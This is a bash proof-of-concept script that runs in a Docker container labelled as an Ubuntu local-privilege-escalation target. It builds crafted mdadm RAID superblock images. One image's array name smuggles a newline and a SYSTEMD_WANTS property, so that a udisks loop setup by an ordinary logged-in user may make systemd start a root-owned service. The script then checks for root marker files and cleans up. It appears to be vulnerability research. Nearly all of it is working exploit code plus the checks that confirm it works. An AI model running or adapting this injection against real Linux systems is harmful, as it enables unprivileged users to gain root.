#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-mdadm-assembly.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail

tmp=/tmp/active-udisks-mdadm-assembly
home=/home/selfauth/active-udisks-mdadm-assembly
root_marker=/root/active_udisks_mdadm_assembly_root
run_marker=/run/active_udisks_mdadm_assembly_root
payload_unit=/etc/systemd/system/active-udisks-mdadm-pwn.service

rm -rf "$tmp" "$home" "$root_marker" "$run_marker"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  systemctl stop active-udisks-mdadm-pwn.service >/dev/null 2>&1 || true
  rm -f "$payload_unit"
  systemctl daemon-reload >/dev/null 2>&1 || true
  mdadm --stop --scan >/dev/null 2>&1 || true
  for md in /dev/md/* /dev/md[0-9]*; do
    [ -e "$md" ] && mdadm --stop "$md" >/dev/null 2>&1 || true
  done
  losetup -a | awk -F: '/active-udisks-mdadm-assembly/ {print $1}' | xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  systemctl reset-failed 'mdadm*' 'mdmon*' 'mdmonitor*' 'active-udisks-mdadm-pwn.service' >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

cat >"$payload_unit" <<'UNIT'
[Unit]
Description=active udisks mdadm metadata injection marker

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /root/active_udisks_mdadm_assembly_root; id > /run/active_udisks_mdadm_assembly_root'
UNIT
systemctl daemon-reload >/dev/null 2>&1 || true

make_members() {
  python3 - "$home" <<'PY'
import hashlib
import os
import struct
import time
import sys

out = sys.argv[1]
cases = [
    ("mdprobe_ok", "mdprobe_ok"),
    ("mdprobe.service", "mdprobe.service"),
    ("newline_wants", "mdprobe\nSYSTEMD_WANTS=active-udisks-mdadm-pwn.service"),
]

def p32(buf, off, val):
    buf[off:off+4] = struct.pack("<I", val & 0xffffffff)

def p64(buf, off, val):
    buf[off:off+8] = struct.pack("<Q", val & 0xffffffffffffffff)

def write_member(path, name, devnum):
    image_size = 64 * 1024 * 1024
    sb = bytearray(4096)
    digest = hashlib.sha256(name.encode("utf-8")).digest()
    set_uuid = digest[:16]
    dev_uuid = hashlib.sha256((name + ":" + str(devnum)).encode("utf-8")).digest()[:16]
    name_b = name.encode("utf-8")[:32]
    now = int(time.time())

    p32(sb, 0, 0xa92b4efc)
    p32(sb, 4, 1)
    p32(sb, 8, 0)
    p32(sb, 12, 0)
    sb[16:32] = set_uuid
    sb[32:32 + len(name_b)] = name_b
    p64(sb, 64, now)
    p32(sb, 72, 1)
    p32(sb, 76, 0)
    p64(sb, 80, 120000)
    p32(sb, 88, 128)
    p32(sb, 92, 2)
    p64(sb, 128, 2048)
    p64(sb, 136, 120000)
    p64(sb, 144, 8)
    p64(sb, 152, 0xffffffffffffffff)
    p32(sb, 160, devnum)
    p32(sb, 164, 0)
    sb[168:184] = dev_uuid
    p64(sb, 192, now)
    p64(sb, 200, 1)
    p64(sb, 208, 120000)
    p32(sb, 216, 0)
    p32(sb, 220, 2)
    sb[256:260] = struct.pack("<HH", 0, 1)

    total = 0
    for off in range(0, 260, 4):
        total = (total + struct.unpack("<I", sb[off:off+4])[0]) & 0xffffffffffffffff
    csum = (total & 0xffffffff) + (total >> 32)
    p32(sb, 216, csum)

    with open(path, "wb") as f:
        f.truncate(image_size)
        f.seek(4096)
        f.write(sb)

for dirname, name in cases:
    case_dir = os.path.join(out, dirname)
    os.makedirs(case_dir, exist_ok=True)
    write_member(os.path.join(case_dir, "a.img"), name, 0)
    write_member(os.path.join(case_dir, "b.img"), name, 1)
PY
}

{
  echo "## target/default reachability"
  cat /etc/os-release | sed -n '1,6p'
  uname -a
  id attacker
  id selfauth
  echo

  echo "## package versions"
  for pkg in mdadm udisks2 systemd udev policykit-1 polkitd; do
    dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>&1 || true
  done | sort
  echo

  echo "## default mdadm/udisks units"
  systemctl list-unit-files mdadm-last-resort@.service mdadm-last-resort@.timer mdmon@.service mdmonitor.service mdmonitor-oneshot.service udisks2.service --no-pager 2>&1 || true
  systemctl list-units mdadm-last-resort@.service mdadm-last-resort@.timer 'mdmon@*' mdmonitor.service mdmonitor-oneshot.service udisks2.service --all --no-pager 2>&1 || true
  echo

  echo "## md kernel support in this docker target"
  grep '^md_mod ' /proc/modules || true
  test -e /sys/module/md_mod && echo "md_mod sysfs present" || echo "md_mod sysfs absent"
  echo

  echo "## active-user UDisks loop setup policy"
  awk '/org.freedesktop.udisks2.loop-setup/{flag=1} flag{print} /<\/action>/{if(flag) exit}' /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
  echo

  echo "## default root rules/units under test"
  nl -ba /usr/lib/udev/rules.d/64-md-raid-assembly.rules | sed -n '34,45p'
  nl -ba /usr/lib/udev/rules.d/63-md-raid-arrays.rules | sed -n '21,43p'
  nl -ba /usr/lib/udev/rules.d/80-udisks2.rules | sed -n '18,23p'
  for unit in /usr/lib/systemd/system/mdadm-last-resort@.service /usr/lib/systemd/system/mdadm-last-resort@.timer /usr/lib/systemd/system/mdmonitor.service /usr/lib/systemd/system/mdmon@.service; do
    echo "### $unit"
    nl -ba "$unit"
  done
  echo

  echo "## crafted member metadata as supplied bytes"
  make_members
  chown -R selfauth:selfauth "$home"
  find "$home" -type f -name '*.img' -printf '%p %s bytes\n' | sort
  for img in "$home"/*/a.img; do
    echo "### mdadm --examine --export $img"
    mdadm --examine --export "$img" 2>&1 | sed -n '1,40p'
    echo "### mdadm --examine name $img"
    mdadm --examine "$img" 2>&1 | sed -n '/Name/,+7p'
  done
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
out=/tmp/active-udisks-mdadm-assembly/user.out
exec >"$out" 2>&1
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
for img in /home/selfauth/active-udisks-mdadm-assembly/*/*.img; do
  echo "## udisks loop setup $img"
  udisksctl loop-setup -f "$img" --no-user-interaction
done
udevadm settle --timeout=20 || true
sleep 5
echo "## selfauth-visible block state"
lsblk --pairs --output NAME,TYPE,FSTYPE,LABEL,UUID,MOUNTPOINT,PATH | sed -n '1,260p'
echo "## loop properties"
for dev in $(losetup -a | awk -F: '/active-udisks-mdadm-assembly/ {print $1}' | sort); do
  echo "### $dev"
  udevadm info --query=property --name "$dev" | grep -E '^(DEVNAME|DEVLINKS|ID_FS|MD_|SYSTEMD|UDISKS)' | sort
done
SH
chmod 0755 "$home/probe.sh"
chown selfauth:selfauth "$home/probe.sh"

cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-mdadm-assembly/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 130 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 || true
sleep 35

{
  cat "$tmp/root-prep.out"
  echo
  echo "## active selfauth UDisks trigger"
  cat "$tmp/user.out" 2>&1 || true
  echo

  echo "## root-observed mdadm/systemd state after trigger"
  cat /proc/mdstat 2>&1 || true
  ls -l /dev/md /dev/md* /dev/disk/by-id/md-* 2>&1 || true
  systemctl list-units 'mdadm*' 'mdmon*' 'mdmonitor*' 'active-udisks-mdadm-pwn.service' --all --no-pager 2>&1 || true
  systemctl status 'mdadm-last-resort@*.timer' 'mdadm-last-resort@*.service' 'mdmon@*.service' mdmonitor.service active-udisks-mdadm-pwn.service --no-pager 2>&1 | sed -n '1,220p' || true
  echo

  echo "## root direct incremental export replay on mapped members"
  for dev in $(losetup -a | awk -F: '/active-udisks-mdadm-assembly/ {print $1}' | sort); do
    echo "### $dev"
    udevadm info --query=property --name "$dev" | grep -E '^(DEVNAME|DEVLINKS|ID_FS|MD_|SYSTEMD|UDISKS)' | sort || true
    set +e
    /sbin/mdadm --incremental --export "$dev" --offroot $(udevadm info --query=property --name "$dev" | sed -n 's/^DEVLINKS=//p') 2>&1 | sed -n '1,80p'
    echo "mdadm_incremental_rc=${PIPESTATUS[0]}"
    set -e
  done
  echo

  echo "## recent mdadm/udev/systemd journal"
  journalctl -b --no-pager -g 'mdadm|mdmon|active-udisks-mdadm|linux_raid_member|md127|md126|md125' -n 240 2>&1 || true
  echo

  echo "## root proof checks"
  for p in "$root_marker" "$run_marker" /tmp/active_udisks_mdadm_assembly_root; do
    if [ -e "$p" ]; then
      echo "ROOT_PROOF_PRESENT $p"
      ls -l "$p"
      cat "$p"
    else
      echo "ROOT_PROOF_ABSENT $p"
    fi
  done
  id selfauth
  getent group sudo adm disk systemd-journal | sed -n '1,20p'
  echo

  echo "## cleanup health before cleanup"
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >"$tmp/root.out" 2>&1

cleanup_target
rm -rf "$home" "$root_marker" "$run_marker" /tmp/active_udisks_mdadm_assembly_root
systemctl reset-failed 'mdadm*' 'mdmon*' 'mdmonitor*' 'active-udisks-mdadm-pwn.service' >/dev/null 2>&1 || true

{
  echo
  echo "## cleanup verification"
  losetup -a | grep active-udisks-mdadm-assembly || true
  cat /proc/mdstat 2>&1 || true
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >>"$tmp/root.out" 2>&1
EOS

docker exec "$container" cat /tmp/active-udisks-mdadm-assembly/root.out > "$log"
docker exec "$container" rm -rf /tmp/active-udisks-mdadm-assembly
sed -n '1,420p' "$log"
